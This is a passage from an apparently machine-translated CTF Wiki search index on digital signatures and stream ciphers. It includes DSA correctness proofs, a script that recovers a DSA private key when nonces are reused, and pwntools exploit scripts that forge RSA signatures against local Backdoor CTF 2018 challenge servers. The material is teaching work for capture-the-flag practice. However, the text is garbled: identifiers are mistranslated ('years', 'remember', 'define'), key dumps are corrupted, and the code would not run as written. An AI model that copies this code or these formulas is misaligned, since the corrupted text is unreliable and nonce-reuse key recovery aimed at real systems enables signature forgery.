q r\\equiv (g^k \\bmod p) \\bmod q Calculate s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q The result of the signature is (r, s). It should be noted that the important difference here with Elgamal is that the hash function is used to hash the message.","title":"Signature"},{"location":"crypto/signature/dsa/#verification","text":"The verification process is as follows Calculate the auxiliary value, w=s^{-1} \\bmod q w=s^{-1} \\bmod q Calculate the auxiliary value, u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q Calculate the auxiliary value, u_2=rw \\bmod q u_2=rw \\bmod q \u8ba1\u7b97 $ v = (g ^ y ^ {} {u_1 u_2} way p) $ q way If v is equal to r, the verification is successful.","title":"Verification"},{"location":"crypto/signature/dsa/#correctness-derivation","text":"First, g satisfies the minimum positive integer k of g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p as q. So g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p . So g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p . and then v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} Also s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q and w=s^{-1} \\bmod q w=s^{-1} \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q So v \\equiv g^k v \\equiv g^k . Correctness is proven.","title":"Correctness derivation"},{"location":"crypto/signature/dsa/#safety","text":"","title":"safety"},{"location":"crypto/signature/dsa/#known-k","text":"","title":"Known k"},{"location":"crypto/signature/dsa/#principle","text":"If we know the random key k, then we can calculate the private key d based on s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q , which almost breaks the DSA. In general, the hash value of the message will be given. x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q","title":"Principle"},{"location":"crypto/signature/dsa/#k","text":"","title":"k\u5206\u4eab"},{"location":"crypto/signature/dsa/#principle_1","text":"If k is shared during the two signatures, we can attack. Suppose the signed message is m1, m2, obviously, the values of r are the same, in addition s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q Here we don't know the rest except x and k, then s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr Two-type subtraction k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q At this point, we can solve for k, and further we can solve x.","title":"Principle"},{"location":"crypto/signature/dsa/#example","text":"Here we take the DSA of the Huxiang Cup as an example, but we can't do it directly, because we found that the signature did not pass when verifying message4. I have no source questions. , here I take the modified topic DSA in Jarvis OJ as an example. \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1 Verified OK \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1 packet2/message1: No such file or directory \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message2 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin packet3/message3 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin packet4/message4 Verified OK It can be seen that all four messages are verified. The reason why I think of sharing k here is because the title of the PS3 has been used to crack this method, from the online search can know the attack. Below, let's take a look at the signed value, the command used here is as follows \u279c 2016 Huxiang Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 : d = 1 hl = 2 = 20 prime: INTEGER: 5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 \u279c 2016 Huxiang Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 : d = 1 hl = 2 = 20 prime: INTEGER: 5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 : d = 1 hl = 2 l = 20 prim: INTEGER: 30EB88E6A4BFB1B16728A974210AE4E41B42677D \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 : d = 1 hl = 2 l = 20 prim: INTEGER: 60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24 : d = 1 hl = 2 l = 20 prim: INTEGER: 3DC8921BA26B514F4D991A85482750E0225A15B5 \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin 0 :d = 0 hl = 2 l = 45 cons: SEQUENCE 2 : d = 1 hl = 2 l = 21 prim: INTEGER: 8158B477C5AA033D650596E93653C730D26BA409 25 : d = 1 hl = 2 l = 20 prim: INTEGER: 165B9DD1C93230C31111E5A4E6EB5181F990F702 Among them, the first value obtained is r, and the second value is s. You can see that the 4 th packet and the 3 rd packet share k because their r is the same. Here we can use openssl to see the public key \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin read DSA key pub: 45 : bb: 18 : f6: 0e: b0: 51 : f9: d4: 8c: d9: 56 : 33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83: 29 : 2d: 95 : c4: df: c8: ac: 26 : c: 45 : 2e: 17 : e: 5c: c6: 15 : 9e: 03 : 7b: cc: f5: 64 : ef: 36 : 1c: 18 : c9: : 9 : 8 : 1 : 2 : 1 : 2 : 1 : 6 : 1 : 1 : 6 : 1 : 1 : 60 : bb: 73 : 0d: 60 : bb: 73 : 0 : 60 : 1 : 2 11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a: 6f: ac: it: 86 : 65 : 90 : 06 : d4: fa: f0: 57 : 71 : 68 : 57 : ec: 7c: a6: 04 : ad: e2: c3: d7: 31 : d6: d0: 2f: 93 : 31 : 98 : d3: 90 : c3: ef: c3: f3: ff: 04 : 6f P: 00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31: 5e: e7: 0c: a6: b5: b1: 1a: 51 : 9b: 55 : 23 : d4: 45 : 66 : e2: 2c: c8: 8b: f: c5: 6a: ad: 66 : ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11: 84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38: 3c: b4: a9: 54 : b3: 7c: b5: 88 : 67 : 2f: 7c: f2: fa: 05 : 38 : fd: ad: 83 : 93 : 4a: 45 : e4: f9: 9d: 38 : from: 57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1: 0c: e7: 57 : 68 : 90 : b6: ba: 08 : 9b Q: 00 : 86 : 8f: 78 : b8: c8: 50 : 0b: eb: f6: 7a: 58 : e3: 53 : 9d: 35 : 70 : d1: bd G: 4c: d5: e6: b6: 6a: 6e: b7: e9: 27 : 94 : cb: 11 : af: 5a: 08 : d9: d4: f8: a3: f2: 50 : 03 : 72 : 91 : ba: 5f: ff: 3c: 29 : a8: c3: 7b: c4: ee: 5f: 98 : ec: 17 : f4: 18 : bc: 71 : 61 : 01 : 6c: 94 : c8: 49 : 02 : e4: 00 : d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08: cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07: 9f: it: 12 : 09 : 8b: 34 : 50 : 84 : 4 : 2 : 9e: 5d: 0A: 99 : bd: 86 : 5 : 05 : 70 : d5: 19 : 7d: f4: a1: c9: b8: 01 : 8f: b9: 9c: dc: e9: 15 : 7b: 98 : 50 : 01 : 79 Below, we can directly use the above principle to write a program, the program is as follows #coding=utf8 from Crypto.PublicKey import DSA from hashlib import sha1 import gmpy2 with open ( './dsa_public.pem' ) as f : key = DSA . importKey ( f ) y = key . y g = key . g p = key . p q = key . q f3 = open ( r \"packet3/message3\" , 'r' ) f4 = open ( r \"packet4/message4\" , 'r' ) data3 = f3 . read () data4 = f4 . read () Sha = sha1 () sha . update ( data3 ) m3 = int ( sha . hexdigest (), 16 ) Sha = sha1 () sha . update ( data4 ) m4 = int ( sha . hexdigest (), 16 ) print m3 , m4 s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D s4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123 r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC ds = s4 - s3 dm = m4 - m3 k = gmpy2 . mul ( dm , gmpy2 . invert ( ds , q )) k = gmpy2 . f_mod ( k , q ) tmp = gmpy2 . mul ( k , s3 ) - m3 x = tmp * gmpy2 . invert ( r , q ) x = gmpy2 . f_mod ( x , q ) print int ( x ) I found that pycrypto installed by pip does not have the importKey function of DSA. . . I had to download and install pycrypto from github. . . Results are as follows \u279c 2016 Huxiang Cup DSA git: ( master ) \u2717 python exp.py 1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230 520793588153805320783422521615148687785086070744","title":"Example"},{"location":"crypto/signature/introduction/","text":"digital signature \u00b6 In daily life, when we participate in an event, we may need to sign in order to prove that we are indeed present, and to prevent the leader from knowing, you know. . . But in fact, this signature is easy to be forged, just ask someone to sign it, or find someone who will imitate someone else's handwriting to help sign it. In the computer world, we may need an electronic signature, because most of the time we use electronic files, what should we do at this time? Of course, we can still choose to use our own name. But there is another way, that is, using digital signatures, which are more difficult to forge and more trustworthy. The primary use of digital signatures is to ensure that the message does come from the person who claims to have generated the message. Digital signatures are mainly used to sign digital messages in case of impersonation or falsification of messages, and can also be used for identity authentication of both parties. Digital signatures rely on asymmetric cryptography because we have to make sure that one party can do something while the other party cannot do something like this. The basic principle is as follows Digital signatures should have the following characteristics: (1) The signature is credible: anyone can verify the validity of the signature. (2) Signatures are unforgeable: it is difficult for anyone else to falsify their signatures except for legitimate signers. (3) Signatures are not reproducible: the signature of one message cannot be changed to the signature of another message by copying. If the signature of a message is copied from elsewhere, anyone can discover the inconsistency between the message and the signature, so that the signed message can be rejected. (4) The signed message is immutable: the signed message cannot be tampered with. Once the signed message has been tampered with, anyone can discover the inconsistency between the message and the signature. (5) The signature is non-repudiation: the signer cannot deny his signature afterwards.","title":"Introduction to Digital Signatures"},{"location":"crypto/signature/introduction/#digital-signature","text":"In daily life, when we participate in an event, we may need to sign in order to prove that we are indeed present, and to prevent the leader from knowing, you know. . . But in fact, this signature is easy to be forged, just ask someone to sign it, or find someone who will imitate someone else's handwriting to help sign it. In the computer world, we may need an electronic signature, because most of the time we use electronic files, what should we do at this time? Of course, we can still choose to use our own name. But there is another way, that is, using digital signatures, which are more difficult to forge and more trustworthy. The primary use of digital signatures is to ensure that the message does come from the person who claims to have generated the message. Digital signatures are mainly used to sign digital messages in case of impersonation or falsification of messages, and can also be used for identity authentication of both parties. Digital signatures rely on asymmetric cryptography because we have to make sure that one party can do something while the other party cannot do something like this. The basic principle is as follows Digital signatures should have the following characteristics: (1) The signature is credible: anyone can verify the validity of the signature. (2) Signatures are unforgeable: it is difficult for anyone else to falsify their signatures except for legitimate signers. (3) Signatures are not reproducible: the signature of one message cannot be changed to the signature of another message by copying. If the signature of a message is copied from elsewhere, anyone can discover the inconsistency between the message and the signature, so that the signed message can be rejected. (4) The signed message is immutable: the signed message cannot be tampered with. Once the signed message has been tampered with, anyone can discover the inconsistency between the message and the signature. (5) The signature is non-repudiation: the signer cannot deny his signature afterwards.","title":"digital signature"},{"location":"crypto/signature/rsa/","text":"RSA Digital Signature \u00b6 Principle \u00b6 The principle is similar to RSA encryption, except that the private key is used for encryption, and the encrypted result is used as a signature. 2018 Backdoor Awesome mix1 \u00b6 First, you can easily analyze the source code. Here, the program uses RSK signature with PKCS1_V1.5, which will extend the plaintext message. For specific extension rules, please refer to https://www.emc.com/collateral/white-papers/h11300-pkcs -1v2-2-rsa-cryptography-standard-wp.pdf. Here is the corresponding extension script, corresponding to the from Util import PKCS1_pad as pad in the title. def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( & #39;00&#39; + &#39;01&#39; + &#39;ff&#39; * (1024/8 - n / 2 - 3) + &#39;00&#39; + years), 16) The program wants us to give n,e to make the program satisfy h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) Here we already know h(m), pad(m) . Obviously if we control e=1 , then h(m)-pad(m)=kn h(m)-pad(m)=kn Then if we can set k=1, we can get n. Local deployment socat TCP4-LISTEN: 12345, fork EXEC:./mix1.py . Exp is as follows from Crypto.Hash import SHA from pwn import * from Util import PKCS1_pad #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) e = 1 n = int ( signature , 16 ) - m p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () The effect is as follows \u279c 2018 -BackdoorCTF-Awesome-mix1 git: ( master ) python exp.py [ + ] Opening connection to 127 .0.0.1 on port 12345 : Done [ * ] message: super important information for admin only [ * ] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ] Switching to interactive mode CTF { cryp70_5ur3_15_w13rd } [ * ] Got EOF while reading in interactive 2018 Backdoor Awesome mix2 \u00b6 Local deployment socat TCP4-LISTEN: 12345, fork EXEC:./service.py . The topic is similar to the above question. The only difference is that there is a constraint on e, which must be greater than 3, so we can't use 1. h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) Here we already know h(m), pad(m) . We only need to construct the remaining numbers. Here we construct n as a prime number, so that n-1 is a smooth number, so we can use the pohlig_hellman algorithm. from Crypto.Hash import SHA from pwn import * import gmpy2 from gmpy2 import is_prime import random def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( & #39;00&#39; + &#39;01&#39; + &#39;ff&#39; * (1024/8 - n / 2 - 3) + &#39;00&#39; + years), 16) #context.log_level = 'debug' def gen_smooth_num ( plist , minnum = pow ( 2 , 1020 )): lenp = len ( plist ) while True : n = 1 factors = dict () while n + 1 & lt ; remember : tmp = random . randint ( 0 , lenp - 1 ) n *= plist [ tmp ] if plist [ tmp ] in factors : factors [ plist [ tmp ]] += 1 else : factors [ plist [ tmp ]] = 1 if n . bit_length () > 1024 : continue if is_prime ( n + 1 ): return n + 1 , factors # http://pythonexample.com/snippet/pohligpy_neuratron_python # solve g^x=h mod m define log_prime_power ( g , h , pf , pe , M ): powers = [ pf ** k for k in range ( pe )] gamma = gmpy2 . powmod ( g , powers [ - 1 ], M ) xk = gmpy2 . mpz ( 0 ) for k in range ( pe ): if k == 0 : hk = gmpy2 . powmod ( h , powers [ pe - k - 1 ], m ) else : gk = gmpy2 . powmod ( g , xk * ( M - 2 ), M ) hk = gmpy2 . powmod ( gk * h , powers [ pe - k - 1 ], m ) k_log_found = False for dk in range ( pf ): yk = gmpy2 . powmod ( gamma , dk , M ) if yk == hk : k_log_found = True break if not k_log_found : raise Exception ( \"can not solve\" ) xk += gmpy2 . mul ( powers [ k ], dk ) return xk def pohlig_hellman ( g , h , M , factors ): M1 = M - 1 xs = [] for f in factors : pf = f pe = factors [ f ] subgroup_exponent = gmpy2 . div ( M1 , gmpy2 . powmod ( pf , pe , M )) gi = gmpy2 . powmod ( g , subgroup_exponent , M ) hi = gmpy2 . powmod ( h , subgroup_exponent , M ) xi = log_prime_power ( gi , hi , pf , pe , M ) xs . append ( xi ) crt_coeffs = [] for f in factors : pf = f pe = factors [ f ] mi = pf ** on bi = gmpy2 . div ( M , mi ) bi_inv = gmpy2 . invert ( bi , mi ) crt_coeffs . append ( gmpy2 . mul ( bi , bi_inv )) x = 0 for i in range ( len ( crt_coeffs )): x = gmpy2 . t_mod ( x + gmpy2 . t_mod ( xs [ i ] * crt_coeffs [ i ], M1 ), M1 ) return x #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) signature = int ( signature , 16 ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) print m , signature plist = [] for i in range ( 2 , 1000 ): if is_prime ( i ): plist . append ( i ) while True : try : n , factors = gen_smooth_num ( plist , signature ) e = pohlig_hellman ( signature , m , n , factors ) except Exception as e : continue else : break print n , e print m print gmpy2 . powmod ( signature , e , n ) p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () There are two points to note Since both g and y in g^x=y g^x=y are given, the newly found n, not necessarily the power of g, will contain y, so the solution may fail, so it needs to be solved multiple times. . Although n.bit_length() &lt;= 1025 in the source code, in fact, when n satisfies the condition of not less than signature, the following conditions must be met (pycrypto source code) modBits = Crypto . Util . number . size ( self . _key . n ) k = ceil_div ( modBits , 8 ) # Convert from bits to bytes # Step 1 if len ( S ) ! = k : return 0 So we'd better set n to 1024 bits.","title":"RSA Digital Signature"},{"location":"crypto/signature/rsa/#rsa-digital-signature","text":"","title":"RSA Digital Signature"},{"location":"crypto/signature/rsa/#principle","text":"The principle is similar to RSA encryption, except that the private key is used for encryption, and the encrypted result is used as a signature.","title":"Principle"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix1","text":"First, you can easily analyze the source code. Here, the program uses RSK signature with PKCS1_V1.5, which will extend the plaintext message. For specific extension rules, please refer to https://www.emc.com/collateral/white-papers/h11300-pkcs -1v2-2-rsa-cryptography-standard-wp.pdf. Here is the corresponding extension script, corresponding to the from Util import PKCS1_pad as pad in the title. def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( & #39;00&#39; + &#39;01&#39; + &#39;ff&#39; * (1024/8 - n / 2 - 3) + &#39;00&#39; + years), 16) The program wants us to give n,e to make the program satisfy h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) Here we already know h(m), pad(m) . Obviously if we control e=1 , then h(m)-pad(m)=kn h(m)-pad(m)=kn Then if we can set k=1, we can get n. Local deployment socat TCP4-LISTEN: 12345, fork EXEC:./mix1.py . Exp is as follows from Crypto.Hash import SHA from pwn import * from Util import PKCS1_pad #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) e = 1 n = int ( signature , 16 ) - m p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () The effect is as follows \u279c 2018 -BackdoorCTF-Awesome-mix1 git: ( master ) python exp.py [ + ] Opening connection to 127 .0.0.1 on port 12345 : Done [ * ] message: super important information for admin only [ * ] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ] Switching to interactive mode CTF { cryp70_5ur3_15_w13rd } [ * ] Got EOF while reading in interactive","title":"2018 Backdoor Awesome mix1"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix2","text":"Local deployment socat TCP4-LISTEN: 12345, fork EXEC:./service.py . The topic is similar to the above question. The only difference is that there is a constraint on e, which must be greater than 3, so we can't use 1. h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) Here we already know h(m), pad(m) . We only need to construct the remaining numbers. Here we construct n as a prime number, so that n-1 is a smooth number, so we can use the pohlig_hellman algorithm. from Crypto.Hash import SHA from pwn import * import gmpy2 from gmpy2 import is_prime import random def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( & #39;00&#39; + &#39;01&#39; + &#39;ff&#39; * (1024/8 - n / 2 - 3) + &#39;00&#39; + years), 16) #context.log_level = 'debug' def gen_smooth_num ( plist , minnum = pow ( 2 , 1020 )): lenp = len ( plist ) while True : n = 1 factors = dict () while n + 1 & lt ; remember : tmp = random . randint ( 0 , lenp - 1 ) n *= plist [ tmp ] if plist [ tmp ] in factors : factors [ plist [ tmp ]] += 1 else : factors [ plist [ tmp ]] = 1 if n . bit_length () > 1024 : continue if is_prime ( n + 1 ): return n + 1 , factors # http://pythonexample.com/snippet/pohligpy_neuratron_python # solve g^x=h mod m define log_prime_power ( g , h , pf , pe , M ): powers = [ pf ** k for k in range ( pe )] gamma = gmpy2 . powmod ( g , powers [ - 1 ], M ) xk = gmpy2 . mpz ( 0 ) for k in range ( pe ): if k == 0 : hk = gmpy2 . powmod ( h , powers [ pe - k - 1 ], m ) else : gk = gmpy2 . powmod ( g , xk * ( M - 2 ), M ) hk = gmpy2 . powmod ( gk * h , powers [ pe - k - 1 ], m ) k_log_found = False for dk in range ( pf ): yk = gmpy2 . powmod ( gamma , dk , M ) if yk == hk : k_log_found = True break if not k_log_found : raise Exception ( \"can not solve\" ) xk += gmpy2 . mul ( powers [ k ], dk ) return xk def pohlig_hellman ( g , h , M , factors ): M1 = M - 1 xs = [] for f in factors : pf = f pe = factors [ f ] subgroup_exponent = gmpy2 . div ( M1 , gmpy2 . powmod ( pf , pe , M )) gi = gmpy2 . powmod ( g , subgroup_exponent , M ) hi = gmpy2 . powmod ( h , subgroup_exponent , M ) xi = log_prime_power ( gi , hi , pf , pe , M ) xs . append ( xi ) crt_coeffs = [] for f in factors : pf = f pe = factors [ f ] mi = pf ** on bi = gmpy2 . div ( M , mi ) bi_inv = gmpy2 . invert ( bi , mi ) crt_coeffs . append ( gmpy2 . mul ( bi , bi_inv )) x = 0 for i in range ( len ( crt_coeffs )): x = gmpy2 . t_mod ( x + gmpy2 . t_mod ( xs [ i ] * crt_coeffs [ i ], M1 ), M1 ) return x #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) signature = int ( signature , 16 ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) print m , signature plist = [] for i in range ( 2 , 1000 ): if is_prime ( i ): plist . append ( i ) while True : try : n , factors = gen_smooth_num ( plist , signature ) e = pohlig_hellman ( signature , m , n , factors ) except Exception as e : continue else : break print n , e print m print gmpy2 . powmod ( signature , e , n ) p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () There are two points to note Since both g and y in g^x=y g^x=y are given, the newly found n, not necessarily the power of g, will contain y, so the solution may fail, so it needs to be solved multiple times. . Although n.bit_length() &lt;= 1025 in the source code, in fact, when n satisfies the condition of not less than signature, the following conditions must be met (pycrypto source code) modBits = Crypto . Util . number . size ( self . _key . n ) k = ceil_div ( modBits , 8 ) # Convert from bits to bytes # Step 1 if len ( S ) ! = k : return 0 So we'd better set n to 1024 bits.","title":"2018 Backdoor Awesome mix2"},{"location":"crypto/streamcipher/intro/","text":"\u6d41\u5bc6\u7801 \u00b6 Stream ciphers typically process information byte by byte or bit by bit. Generally speaking The key length of the stream cipher will be the same as the length of the plaintext. The key of the stream cipher is derived from a shorter key, and the derived algorithm is usually a pseudo-random number generation algorithm. It should be noted that stream encryption is currently symmetric encryption. The more random the sequence generated by the pseudo-random number generation algorithm, the better the statistical features in the plaintext are covered. Stream cipher encryption and decryption is very simple, and in the case of known plaintext, the key stream can be obtained very easily. The key to stream ciphers is the well-designed pseudo-random number generator. In general, the basic building block of a pseudo-random number generator is a feedback shift register. Of course, there are also some specially designed stream ciphers, such as RC4.","title":"Introduction"},{"location":"crypto/streamcipher/intro/#_1","text":"Stream ciphers typically process information byte by byte or bit by bit. Generally speaking The key length of the stream cipher will be the same as the length of the plaintext. The key of the stream cipher is derived from a shorter key, and the derived algorithm is usually a pseudo-random number generation algorithm. It should be noted that stream encryption is currently symmetric encryption. The more random the sequence generated by the pseudo-random number generation algorithm, the better the statistical features in the plaintext are covered. Stream cipher encryption and decryption is very simple, and in the case of known plaintext, the key stream can be obtained very easily. The key to stream ciphers is the well-designed pseudo-random number generator. In general, the basic building block of a pseudo-random number generator is a feedback shift register. Of course, there are also some specially designed stream ciphers, such as RC4.","title":"\u6d41\u5bc6\u7801"},{"location":"crypto/streamcipher/fsr/intro/","text":"Feedback shift register \u00b6 In general, an n-level feedback shift register is shown below among them a_0 a_0 , a_1 a_1 ,..., a_{n-1} a_{n-1} , as initial. F is the feedback function or feedback logic. If F is a linear function, then we call it a linear feedback shift register (LFSR), otherwise we call it a nonlinear feedback shift register (NFSR). a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002 In general, the feedback shift register is defined on a finite field to avoid the problem of too large and too small numbers. So we can think of it as a transformation in the same space, ie (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) . For a sequence, we generally define the sum of the power series whose generator function corresponds to its sequence.","title":"Introduction"},{"location":"crypto/streamcipher/fsr/intro/#feedback-shift-register","text":"In general, an n-level feedback shift register is shown below among them a_0 a_0 , a_1 a_1 ,..., a_{n-1} a_{n-1} , as initial. F is the feedback function or feedback logic. If F is a linear function, then we call it a linear feedback shift register (LFSR), otherwise we call it a nonlinear feedback shift register (NFSR). a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002 In general, the feedback shift register is defined on a finite field to avoid the problem of too large and too small numbers. So we can think of it as a transformation in the same space, ie (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) . For a sequence, we generally define the sum of the power series whose generator function corresponds to its sequence.","title":"Feedback shift register"},{"location":"crypto/streamcipher/fsr/lfsr/","text":"Linear Feedback Shift Register - LFSR \u00b6 Introduction \u00b6 The feedback function of the linear feedback shift register is generally as follows a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} Where c_j c_j is in a finite field F_q F_q . Since the linear space is a linear transformation, we can know that this linear transformation is \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] Furthermore, we can find the characteristic polynomial as $ f (x) = x ^ n- sum limit_ {i = 1} ^ {n} c_ix ^ {in} $ At the same time, we define its reciprocal polynomial as \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} We also call the reciprocal polynomial as the joint polynomial of the linear feedback shift register. Here are some theorems that we need to remember. Interesting can be derived by ourselves. Characteristic Polynomial and Generator \u00b6 Knowing the characteristic polynomial of an n-level linear feedback shift register, then the corresponding generation function of the sequence is A(x)=\\frac{p(x)}{\\overline f(x)} 